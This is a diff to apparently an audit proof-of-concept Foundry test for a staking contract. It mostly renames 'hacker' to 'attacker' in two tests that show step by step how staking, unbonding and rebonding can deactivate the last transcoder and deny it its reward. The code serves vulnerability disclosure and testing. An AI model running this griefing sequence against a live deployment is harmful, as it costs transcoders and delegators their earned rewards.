@@ -132,32 +132,32 @@ contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
     }
 
     function testPoc() public {
-        address hacker = newAddr();
+        address attacker = newAddr();
         address lastTranscoder = _getLastTranscoder();
 
         // Attacker needs 450 + 2 lpt to execute the attack
         vm.prank(minter);
-        lpt.mint(hacker, 450 * 1e18 + 2);
+        lpt.mint(attacker, 450 * 1e18 + 2);
 
         // ---------------------- ROUND = 45816 ----------------------
         _skipToNextRound();
 
         // Attacker bonds for themself to make their status in the next round become "Bonded"
-        vm.startPrank(hacker);
+        vm.startPrank(attacker);
         lpt.approve(address(bondingManager), type(uint256).max);
-        bondingManager.bond(1, hacker);
+        bondingManager.bond(1, attacker);
         vm.stopPrank();
 
         // ---------------------- ROUND = 45817 ----------------------
         _skipToNextRound();
 
         // Attacker bonds more than the last transcoder and kicks them out of the `transcoderPool`
-        vm.startPrank(hacker);
-        bondingManager.bond(450 * 1e18, hacker);
-        assertEq(hacker, _getLastTranscoder());
+        vm.startPrank(attacker);
+        bondingManager.bond(450 * 1e18, attacker);
+        assertEq(attacker, _getLastTranscoder());
 
         // Attacker unbonds all to make the `transcoderPool` not full
-        bondingManager.unbond(_getDelegatorData(hacker).bondedAmount);
+        bondingManager.unbond(_getDelegatorData(attacker).bondedAmount);
 
         // The `lastTranscoder` is added into the `transcoderPool` again and becomes deactivated
         bondingManager.bond(1, lastTranscoder);
@@ -170,53 +170,51 @@ contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
         vm.prank(lastTranscoder);
         bondingManager.reward();
         console.log(_getTranscoderData(lastTranscoder).deactivationRound);
-
-        // Note that the attacker can still withdraw all the funds they use for the attack at the withdrawRound
     }
 
     function testPocRebond() public {
         // Attacker needs two accounts for the attack
-        address hacker = newAddr();
-        address hackerForRebond = newAddr();
+        address attacker = newAddr();
+        address attackerForRebond = newAddr();
         address lastTranscoder = _getLastTranscoder();
 
         // Attacker needs 450 + 3 lpt to execute the attack
         vm.startPrank(minter);
-        lpt.mint(hacker, 450 * 1e18 + 1);
-        lpt.mint(hackerForRebond, 2);
+        lpt.mint(attacker, 450 * 1e18 + 1);
+        lpt.mint(attackerForRebond, 2);
         vm.stopPrank();
 
         // ---------------------- ROUND = 45816 ----------------------
         _skipToNextRound();
 
         // Attacker bonds to the last transcoder and immediately unbonds
-        vm.startPrank(hackerForRebond);
+        vm.startPrank(attackerForRebond);
         lpt.approve(address(bondingManager), type(uint256).max);
         bondingManager.bond(2, lastTranscoder);
         vm.stopPrank();
 
         // Attacker bonds for themself to make their status in the next round become "Bonded"
-        vm.startPrank(hacker);
+        vm.startPrank(attacker);
         lpt.approve(address(bondingManager), type(uint256).max);
-        bondingManager.bond(1, hacker);
+        bondingManager.bond(1, attacker);
         vm.stopPrank();
 
         // ---------------------- ROUND = 45817 ----------------------
         _skipToNextRound();
 
         // Attacker bonds more than the last transcoder and kicks them out of the `transcoderPool`
-        vm.startPrank(hacker);
-        bondingManager.bond(450 * 1e18, hacker);
-        assertEq(hacker, _getLastTranscoder());
+        vm.startPrank(attacker);
+        bondingManager.bond(450 * 1e18, attacker);
+        assertEq(attacker, _getLastTranscoder());
 
         // Attacker unbonds all to make the `transcoderPool` not full
-        bondingManager.unbond(_getDelegatorData(hacker).bondedAmount);
+        bondingManager.unbond(_getDelegatorData(attacker).bondedAmount);
         vm.stopPrank();
 
         // Attacker unbonds and rebonds the last transcoder,
         // the `lastTranscoder` is added into the `transcoderPool` again and becomes deactivated
-        uint256 unbondingLockId = _getDelegatorData(hackerForRebond).nextUnbondingLockId;
-        vm.startPrank(hackerForRebond);
+        uint256 unbondingLockId = _getDelegatorData(attackerForRebond).nextUnbondingLockId;
+        vm.startPrank(attackerForRebond);
         bondingManager.unbond(1);
         bondingManager.rebond(unbondingLockId);
         vm.stopPrank();
@@ -228,9 +226,5 @@ contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
         vm.prank(lastTranscoder);
         bondingManager.reward();
         console.log(_getTranscoderData(lastTranscoder).deactivationRound);
-
-        // Note that the attacker can still withdraw all the funds they use for the attack at the withdrawRound
     }
-
-    receive() external payable {}
 }
